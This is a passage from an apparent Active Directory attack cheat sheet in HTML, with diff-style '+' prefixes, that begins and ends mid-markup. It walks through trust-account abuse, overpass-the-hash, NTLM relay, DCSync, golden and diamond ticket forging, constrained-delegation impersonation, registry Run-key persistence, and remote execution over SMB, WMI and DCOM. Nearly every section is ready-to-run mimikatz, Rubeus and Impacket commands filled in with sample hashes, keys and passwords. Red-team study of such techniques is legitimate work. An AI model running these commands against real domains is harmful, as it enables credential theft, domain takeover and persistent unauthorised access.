+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>Asktgs with the generated kirbi ticket<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Rubeus.exe asktgs /ticket:&lt;path&gt;\ticket.kirbi /service:HTTP/dc02.contose.local /dc:dc02.contoso.local /ptt
+</span></span></code></pre></td></tr></table></div></div>``</li></ol><a href=#shadow-principalpam-trust><h3 id=shadow-principalpam-trust><span class=hanchor arialabel=Anchor># </span>Shadow Principal/PAM Trust</h3></a><p>The users in current forest can be &ldquo;mapped&rdquo; to privileged group like Domain Admins and Enterprise Admins. Use below command to enumerate <em>Shadow Principal</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Get-ADObject -Filter * -SearchBase (&#34;CN=Shadow Principal Configuration,CN=Services,&#34; + (Get-ADRootDSE).configurationNamingContext) | select Name,member,msDS-ShadowPrincipalSid | fl
+</span></span></code></pre></td></tr></table></div></div><ul><li><code>name</code> = Name of the shadow security principal</li><li><code>member</code> = member of group/user in the bastion domain</li><li><code>msds-ShadowPrincipalSid</code> = The SID for production domain group/user</li></ul><a href=#foreign-principal><h3 id=foreign-principal><span class=hanchor arialabel=Anchor># </span>Foreign Principal</h3></a><p>Foreign principal means other user(s) from trusted domain that have access to current domain resources</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Get foreign user principals
+</span></span><span class=line><span class=cl>Find-ForeignUser
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Get foreign group principals
+</span></span><span class=line><span class=cl>Find-ForeignGroup
+</span></span></code></pre></td></tr></table></div></div><a href=#trust-account><h3 id=trust-account><span class=hanchor arialabel=Anchor># </span>Trust Account</h3></a><p><em>Note that this is not an exploit that could be escalated directly to higher privileged user. This is intend to give you a authenticated user access on another forest</em>
+Trust Account is created upon trust initiation (domain/trust) and it appears to be a member of Domain Users. Trust accounts will hold the same password/key on both domain/forest which we can use to move laterally from forest-to-forest.</p><ol><li>Get the trust account hash. This can either be obtained through
+<a rel=noopener class="internal-link broken" data-src=#dcsync>DCSync</a> or the following command to dump trust keys</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mimikatz# lsadump::trust /patch 
+</span></span><span class=line><span class=cl>[[..snip..]]
+</span></span><span class=line><span class=cl>[ Out ] KIWI.LOCAL -&gt; RANGE.NET
+</span></span><span class=line><span class=cl>    * 6/29/2022 1:05:07 PM - CLEAR   - 5e 88 f5 8e bf 01 83 8f 61 39 50 37 77 d8 ce 86 b0 90 f8 e4 b5 2e ef e2 03 dd bf 4c
+</span></span><span class=line><span class=cl>        * aes256_hmac       a3edf4ac6cb5ed1583434348a67454d66e9fcd25d97c3e930c24790dbfa1d15f
+</span></span><span class=line><span class=cl>        * aes128_hmac       6e362139cacfdd8956d986fc8e33f0e9
+</span></span><span class=line><span class=cl>        * rc4_hmac_nt       4cc0dd338664b4208fa6a1a4a7bee224
+</span></span><span class=line><span class=cl>[[..snip..]]
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Request TGT for the trust account by using the key dumped (aes/rc4). <em>Note: this wouldn&rsquo;t work over NTLM authentication, only kerberos</em></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># rubeus
+</span></span><span class=line><span class=cl>Rubeus.exe asktgt /user:RANGE$ /rc4:4cc0dd338664b4208fa6a1a4a7bee224 /domain:kiwi.local /dc:kiwi-dc.kiwi.local /nowrap
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># impacket
+</span></span><span class=line><span class=cl>getTGT.py kiwi.local/range\$ -hashes :4cc0dd338664b4208fa6a1a4a7bee224 -dc-ip 192.168.86.189
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>Now you should be able to use the retrieved TGT to interact with the trusted forest.</li></ol><a href=#lateral-movement--post-exploitation><h1 id=lateral-movement--post-exploitation><span class=hanchor arialabel=Anchor># </span>Lateral Movement / Post Exploitation</h1></a><a href=#overpass-the-hash-opth><h3 id=overpass-the-hash-opth><span class=hanchor arialabel=Anchor># </span>Overpass-The-Hash (OPTH)</h3></a><p><em>Note: This requires local administrator privilege</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># NTLM hash
+</span></span><span class=line><span class=cl>mimikatz# sekurlsa::pth /user:administrator /ntlm:&lt;ntlm hash&gt; /domain:CONTOSO /run:powershell.exe
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># AES256 key
+</span></span><span class=line><span class=cl>mimikatz# sekurlsa::pth /user:administrator /aes256:&lt;aes256 key&gt; /domain:CONTOSO /run:powershell.exe
+</span></span></code></pre></td></tr></table></div></div><a href=#request-tgt><h3 id=request-tgt><span class=hanchor arialabel=Anchor># </span>Request TGT</h3></a><p><em>Note: This will be log by the KDC</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># With plain-text
+</span></span><span class=line><span class=cl>Rubeus.exe asktgt /user:administrator /password:P@$$w0rd! /domain:contoso /ptt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># With RC4 hash
+</span></span><span class=line><span class=cl>Rubeus.exe asktgt /user:administraot /rc4:&lt;rc4-hash&gt; /domain:contoso /ptt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Linux
+</span></span><span class=line><span class=cl>getTGT.py legitcorp.local/lowpriv:&#39;P@$$w0rd&#39; -dc-ip 192.168.86.170
+</span></span><span class=line><span class=cl>export KRB5CCNAME=lowpriv.ccache
+</span></span></code></pre></td></tr></table></div></div><a href=#runas><h3 id=runas><span class=hanchor arialabel=Anchor># </span>runas</h3></a><p>This method will spawn a new process as the user. This wont validate your password, so make sure you enter it right. Slowly but surely :)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>runas /user:contoso\administrator /netonly powershell
+</span></span></code></pre></td></tr></table></div></div><a href=#ntlm-relay><h3 id=ntlm-relay><span class=hanchor arialabel=Anchor># </span>NTLM Relay</h3></a><p><em>Note: This attack will only work if SMB signing if disabled. This can be verify with
+<a href=https://github.com/byt3bl33d3r/CrackMapExec rel=noopener>CrackMapExec</a> or any similar tools</em></p><ol><li>Disable <strong>SMB</strong> and <strong>HTTP</strong> in <code>/etc/Responder.conf</code></li><li>Fire up responder. <strong>SMB</strong> and <strong>HTTP</strong> protocol now should now show as [OFF]<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Responder.py -I eth0 -rdvw
+</span></span></code></pre></td></tr></table></div></div>``</li><li>Create a targets.txt file containing targeted ip addresses. <code>ntlmrelayx.py</code> will run captured hash to every protocol available on the given ip addresses<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>all://192.168.0.10
+</span></span><span class=line><span class=cl>all://192.168.0.11
+</span></span></code></pre></td></tr></table></div></div>``</li><li>Run <code>ntlmrelayx.py</code><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ntlmrelayx.py -tf targets.txt -smb2support -socks
+</span></span></code></pre></td></tr></table></div></div>``</li><li>Authenticate with any available Impacket scripts through <code>proxychains</code> and supply no password<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># PsExec
+</span></span><span class=line><span class=cl>proxychains Psexec.py contoso/administrator:&#39;&#39;@192.168.0.10
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># mssqlclient
+</span></span><span class=line><span class=cl>proxychains mssqlclient.py contoso/sqlsvc:&#39;&#39;@192.168.0.15 -windows-auth -debug
+</span></span></code></pre></td></tr></table></div></div>``</li></ol><a href=#credential-harvesting><h3 id=credential-harvesting><span class=hanchor arialabel=Anchor># </span>Credential Harvesting</h3></a><a href=#dcsync><h3 id=dcsync><span class=hanchor arialabel=Anchor># </span>DCSync</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Dump all available domain users
+</span></span><span class=line><span class=cl>mimikatz# lsadump::dcsync /domain:fqdn /all /csv
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Dump for specific user
+</span></span><span class=line><span class=cl>mimikatz# lsadump::dcsync /domain:fqdn /user:krbtgt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Dump (if no privileged user session)
+</span></span><span class=line><span class=cl>lsadump::dcsync /domain:contoso.local /dc:dc01 /user:administrator /authuser:dc01$ /authdomain:contoso.local /authpassword:&#34;&#34; /authntlm
+</span></span></code></pre></td></tr></table></div></div><a href=#persistence><h1 id=persistence><span class=hanchor arialabel=Anchor># </span>Persistence</h1></a><a href=#golden-ticket><h3 id=golden-ticket><span class=hanchor arialabel=Anchor># </span>Golden Ticket</h3></a><p>A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket. The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine</p><table><thead><tr><th>Attribute</th><th>Value</th></tr></thead><tbody><tr><td>Domain</td><td>legitcorp.local</td></tr><tr><td>Domain SID</td><td>S-1-5-21-1935943001-39345449-285568504</td></tr><tr><td>krbtgt hash</td><td>7e8612a348a729bcb2f597a9cbc27c12</td></tr><tr><td>Username</td><td>trex</td></tr></tbody></table><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Mimikatz
+</span></span><span class=line><span class=cl>kerberos::golden /domain:legitcorp.local /sid:S-1-5-21-1935943001-39345449-285568504 /rc4:7e8612a348a729bcb2f597a9cbc27c12 /user:trex /ptt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Impacket
+</span></span><span class=line><span class=cl>ticketer.py -domain legitcorp.local -nthash 7e8612a348a729bcb2f597a9cbc27c12 -dc-ip 192.179.86.170 -domain-sid S-1-5-21-1935943001-39345449-285568504 trex
+</span></span></code></pre></td></tr></table></div></div><a href=#diamond-ticket><h3 id=diamond-ticket><span class=hanchor arialabel=Anchor># </span>Diamond Ticket</h3></a><p>A diamond ticket is quite different from a
+<a rel=noopener class="internal-link broken" data-src=#golden-ticket>Golden Ticket</a> because golden ticket wouldn&rsquo;t require TGT request since it can be forged offline. Diamond ticket is where we can request a valid user&rsquo;s TGT regardless the level of access on the domain, then the ticket will be modified to allow us to request TGS for a specific service. This is a better technique because normally golden ticket is easier to detect by monitoring for service ticket requests (TGS-REQs) that have no correspokding TGT request (AS-REQ). Detailed steps are as follows:-</p><table><thead><tr><th>Attribute</th><th>Value</th></tr></thead><tbody><tr><td>Username & Password</td><td>loki:Password123</td></tr><tr><td>Domain</td><td>range.net</td></tr><tr><td>krbtgt AES-256 Key</td><td>8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee</td></tr><tr><td>User in PAC</td><td>rangeadm</td></tr></tbody></table><ol><li>Request a diamond key with
+<a href=https://github.com/GhostPack/Rubeus rel=noopener>Rubeus</a>. It does the following steps:-<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>i. Request normal user TGT
+</span></span><span class=line><span class=cl>ii. Decrypt the TGT with krbtgt aes key
+</span></span><span class=line><span class=cl>iii. Modify ticket PAC and insert _rangeadm_ in the PAC
+</span></span></code></pre></td></tr></table></div></div>``<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Rubeus.exe diamond /krbkey:8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee /user:loki /password:Password123 /enctype:aes /domain:range.net /dc:dc01.range.net /ticketuser:rangeadm /ticketuserid:1104 /groups:512 /nowrap
+</span></span></code></pre></td></tr></table></div></div>``</li><li>To verify the Diamond ticket (modified TGT), requst a service ticket (TGS)<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.\Rubeus.exe asktgs /ticket:&lt;tgt&gt; /service:cifs/dc01.range.net /nowrap
+</span></span></code></pre></td></tr></table></div></div>``
+For detailed explanation, read this article by Semperis
+<a href=https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/ rel=noopener>here</a></li></ol><a href=#msds-allowedtodelegateto><h3 id=msds-allowedtodelegateto><span class=hanchor arialabel=Anchor># </span>msDS-AllowedToDelegateTo</h3></a><p>Note that the <code>msDS-AllowedToDelegateTo</code> is the user account flag which controls the services to which a user accounts has access to. This means, with enough privileges, it is possible to access any service from a target user.</p><ol><li>Set the <code>msDS-AllowedToDelegateTo</code> attribute of a user <em>lowpriv</em> to give privilege for it to request ticket for <em>cifs</em> service to dc01.<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># AD Module / RSAT
+</span></span><span class=line><span class=cl>Set-ADUser -Identity lowpriv -Add @{&#39;msDS-AllowedToDelegateTo&#39;=@(&#39;cifs/dc01.legitcorp.local&#39;)} -Verbose
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># PowerView
+</span></span><span class=line><span class=cl>Set-DomainObject -Identity lowpriv -Set @{&#34;msds-allowedtodelegateto&#34;=&#34;cifs/dc01.legitcorp.local&#34;}
+</span></span><span class=line><span class=cl>Set-DomainObject -SamAccountName lowpriv -Xor @{&#34;useraccountcontrol&#34;=&#34;16777216&#34;}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Linux
+</span></span><span class=line><span class=cl>setCD.py legitcorp.local/Administrator:&#39;P@$$w0rd!xyz&#39; -dc-ip 192.168.86.170 -target &#39;lowpriv&#39; -spn &#39;cifs/dc01.legitcorp.local&#39;
+</span></span></code></pre></td></tr></table></div></div>``</li><li>Request the service ticket for <em>cifs</em> service with impacket
+<a href=https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/getST.py rel=noopener>getST.py</a> and impersonate to administrator.<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Rubeus
+</span></span><span class=line><span class=cl>Rubeus.exe hash /user:lowpriv /password:&#39;P@$$w0rd!xyz&#39; /domain:legitcorp.local
+</span></span><span class=line><span class=cl>Rubeus.exe s4u /user:lowpriv /rc4:098D747A5D113F6AE9D6A599EB8E539B /domain:legitcorp.local /impersonateuser:administrator /msdsspn:cifs/dc01.legitcorp.local /ptt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Impacket
+</span></span><span class=line><span class=cl>getST.py -spn cifs/dc01.legitcorp.local legitcorp.local/lowpriv:&#39;P@$$w0rd!xyz&#39; -dc-ip 192.168.86.170 -impersonate &#39;administrator&#39;
+</span></span><span class=line><span class=cl>export KRB5CCNAME=&#39;administrator.ccache&#39;
+</span></span></code></pre></td></tr></table></div></div>``</li><li>Getting an interactive shell with smbexec.py. Note that there are other several ways to achieve this and executing smbexec.py or psexec.py might cause a noisy traffic on the environment.<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Sysinternal
+</span></span><span class=line><span class=cl>PsExec64.exe -accepteula \\dc01.legitcorp.local cmd
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Impacket
+</span></span><span class=line><span class=cl>smbexec.py legitcorp.local/Administrator@dc01.legitcorp.local -dc-ip 192.168.86.170 -no-pass -k
+</span></span></code></pre></td></tr></table></div></div>``</li></ol><a href=#registry-keys><h3 id=registry-keys><span class=hanchor arialabel=Anchor># </span>Registry Keys</h3></a><a href=#execute-on-startup><h3 id=execute-on-startup><span class=hanchor arialabel=Anchor># </span>Execute on startup</h3></a><p>There are several registry keys can be added to execute binary on startup based on your need and current user context.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
+</span></span><span class=line><span class=cl>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce 
+</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run 
+</span></span><span class=line><span class=cl>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+</span></span></code></pre></td></tr></table></div></div><ol><li>Add a new value to one of the KeyName above<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v RunMe /t REG_SZ /d &#34;C:\Users\Public\mybinary.exe&#34;
+</span></span></code></pre></td></tr></table></div></div>``</li></ol><a href=#krbtgt-constrained-delegation><h3 id=krbtgt-constrained-delegation><span class=hanchor arialabel=Anchor># </span>krbtgt Constrained Delegation</h3></a><ol><li>Add a new computer account with
+<a href=https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/addcomputer.py rel=noopener>addcomputer.py</a>. This steps would require a domain account with a privilege to create computer account. (Domain objects are allowed to create up to 10 computer accounts in a domain as per default configuration).<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>addcomputer.py -computer-name FakeComputer -computer-pass &#39;Passw0rd&#39; -dc-ip 192.168.86.170 legitcorp.local/lowpriv:&#39;P@$$w0rd!xyz&#39;
+</span></span></code></pre></td></tr></table></div></div>``</li><li>Set the <em>msDS-AllowedToDelegateTo</em> attribute to <code>krbtgt/legitcorp</code>.
+<a href=https://gist.githubusercontent.com/snovvcrash/c8f8fa7721c40f4cca0c46c196066a41/raw/3ddd82ab44048d0fe8530ae2da87199cdc70779f/setCD.py rel=noopener>setCD.py</a> is a script by
+<a href=https://twitter.com/snovvcrash rel=noopener>@snovvcrash</a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>setCD.py legitcorp.local/Administrator:&#39;P@$$w0rd!xyz&#39; -dc-ip 192.168.86.170 -target &#39;FakeComputer$&#39; -spn krbtgt/legitcorp
+</span></span></code></pre></td></tr></table></div></div>``</li><li>Request service ticket for the created computer by impersonating domain controller computer account (s4u delegation).<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># request service ticket
+</span></span><span class=line><span class=cl>getST.py -spn krbtgt/legitcorp legitcorp.local/FakeComputer\$:&#39;Passw0rd&#39; -dc-ip 192.168.86.170 -impersonate &#39;DC01$&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># export ticket into environment variable
+</span></span><span class=line><span class=cl>export KRB5CCNAME=&#39;DC01$.ccache&#39;
+</span></span></code></pre></td></tr></table></div></div>``</li><li>Perform DCSync on the domain controller<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>secretsdump.py legitcorp.local/DC01\$@dc01.legitcorp.local -dc-ip 192.168.86.170 -just-dc -k -no-pass
+</span></span></code></pre></td></tr></table></div></div>``
+You can read more from this great
+<a href=https://skyblue.team/posts/delegate-krbtgt/ rel=noopener>article</a> from
+<a href=https://twitter.com/citronneur rel=noopener>citronneur</a>. <em>CAVEAT: This is not really an OPSEC safe choice to perform persistence. So please be extra careful and cautious when executing the above steps</em></li></ol><a href=#remote-authentication-between-computers><h1 id=remote-authentication-between-computers><span class=hanchor arialabel=Anchor># </span>Remote Authentication Between Computers</h1></a><a href=#ps-remoting><h3 id=ps-remoting><span class=hanchor arialabel=Anchor># </span>PS Remoting</h3></a><p><strong>PS Remoting</strong> stands for PowerShell remoting, this will enable users to authenticate between powershell session in remote computers by using <code>*-PSSession</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Create New PSRemoting Session (with current user privilege/no PSCredential needed)
+</span></span><span class=line><span class=cl>$sess = New-PSSession -ComputerName dc01
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Create New PS Remoting Session (with plain-text password/PSCredential needed)
+</span></span><span class=line><span class=cl>$username = &#39;contoso\studentadmin&#39;
+</span></span><span class=line><span class=cl>$password = ConvertTo-SecureString -AsPlainText -Force &#39;P@$$w0rd!&#39;
+</span></span><span class=line><span class=cl>$cred = New-Object System.Management.Automation.PSCredential($username,$password)
+</span></span><span class=line><span class=cl>$sess = New-PSSession -ComputerName dc01 -Credential $cred
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Get Interactive Remote Session
+</span></span><span class=line><span class=cl>Enter-PSSession -ComputerName dc01
+</span></span><span class=line><span class=cl>Enter-PSSession -ComputerName dc01 -Credential $cred
+</span></span><span class=line><span class=cl>Enter-PSSession -Session $sess
+</span></span></code></pre></td></tr></table></div></div><a href=#winrs><h3 id=winrs><span class=hanchor arialabel=Anchor># </span>Winrs</h3></a><p>Winrs requires a plain-text password in order to authenticate to other computers</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>winrs -u:dc01.contoso.local -u:contoso\administrator -p:P@$$w0rd! &#34;hostname&#34;
+</span></span></code></pre></td></tr></table></div></div><a href=#smb><h3 id=smb><span class=hanchor arialabel=Anchor># </span>SMB</h3></a><p><strong>PsExec</strong>
+This requires you to download MS Signed Binary (<code>PsExec.exe</code>) in PsTools bundle. It can be downloaded
+<a href=https://download.sysinternals.com/files/PSTools.zip rel=noopener>here</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># windows
+</span></span><span class=line><span class=cl>PsExec.exe -accepteula \\dc01.contoso.local powershell
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># linux
+</span></span><span class=line><span class=cl>psexec.py legitcorp.local/Administrator@192.168.0.110
+</span></span></code></pre></td></tr></table></div></div><p><strong>SMBExec</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>smbexec.py legitcorp.local/Administrator@192.168.0.110
+</span></span></code></pre></td></tr></table></div></div><a href=#wmi><h3 id=wmi><span class=hanchor arialabel=Anchor># </span>WMI</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>wmiexec.py legitcorp.local/Administrator@192.168.0.110
+</span></span></code></pre></td></tr></table></div></div><a href=#dcom><h3 id=dcom><span class=hanchor arialabel=Anchor># </span>DCOM</h3></a><p>ShellBrowserWindow object can be leverage for remote code execution over DCOM. Please note that this requires authentication (e.g. runas netonly)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PS&gt; $com = [Type]::GetTypeFromCLSID(&#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#39;,&#34;192.168.112.200&#34;)
+</span></span><span class=line><span class=cl>PS&gt; $obj = [System.Activator]::CreateInstance($com)
